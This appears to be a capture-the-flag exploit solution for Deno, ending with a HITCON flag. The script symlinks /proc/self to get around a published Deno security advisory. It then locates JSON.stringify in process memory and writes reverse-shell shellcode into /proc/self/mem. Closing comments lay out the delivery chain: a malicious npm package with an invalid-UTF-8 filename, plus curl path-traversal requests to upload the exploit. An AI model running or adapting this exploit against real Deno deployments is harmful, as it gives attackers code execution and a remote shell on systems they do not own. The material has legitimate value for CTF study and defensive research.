try {
	Deno.removeSync('/tmp/self')
} catch {}
Deno.symlinkSync('/proc/self', '/tmp/self') // bypass https://github.com/denoland/deno/security/advisories/GHSA-23rx-c3g5-hv9w
const maps = Deno.readTextFileSync('/tmp/self/maps')
const first = maps.split('\n').find(x => x.includes('deno'))
const offset = 0x401c2c0 // p &Builtins_JsonStringify-0x555555554000
const base = parseInt(first.split('-')[0], 16)
const addr = base + offset
console.log('&Builtins_JsonStringify', addr.toString(16))

const mem = Deno.openSync('/tmp/self/mem', {
	write: true
})

/*
from pwn import *
context.arch = 'amd64'
sc = asm(shellcraft.connect('127.0.0.1', 3535, 'ipv4') + shellcraft.dupsh())   
print(list(sc))
*/

const shellcode = new Uint8Array([
	106, 41, 88, 106, 2, 95, 106, 1, 94, 153, 15, 5, 72, 137, 197, 72, 184, 1, 1, 1, 1, 1, 1, 1, 2, 80, 72, 184, 3, 1,
	12, 206, 126, 1, 1, 3, 72, 49, 4, 36, 106, 42, 88, 72, 137, 239, 106, 16, 90, 72, 137, 230, 15, 5, 72, 137, 239,
	106, 2, 94, 106, 33, 88, 15, 5, 72, 255, 206, 121, 246, 106, 104, 72, 184, 47, 98, 105, 110, 47, 47, 47, 115, 80,
	72, 137, 231, 104, 114, 105, 1, 1, 129, 52, 36, 1, 1, 1, 1, 49, 246, 86, 106, 8, 94, 72, 1, 230, 86, 72, 137, 230,
	49, 210, 106, 59, 88, 15, 5
])
mem.seekSync(addr, Deno.SeekMode.Start)
mem.writeSync(shellcode)
JSON.stringify('pwned')

/*
1. create a npm package with filename includes invalid utf-8 and publish  (tar czf package.tar.gz exppkg && npm publish package.tar.gz --access public)
2. curl 'http://localhost:8000/query?package=@maple3142/exploit_of_truth_of_npm'
3. curl --path-as-is 'http://localhost:8000/../../deno-dir/npm/registry.npmjs.org/@maple3142/exploit_of_truth_of_npm/0.0.1/exp%ff' -T exp.js
*/
// hitcon{the_fix_that_does_not_really_address_the_issue}
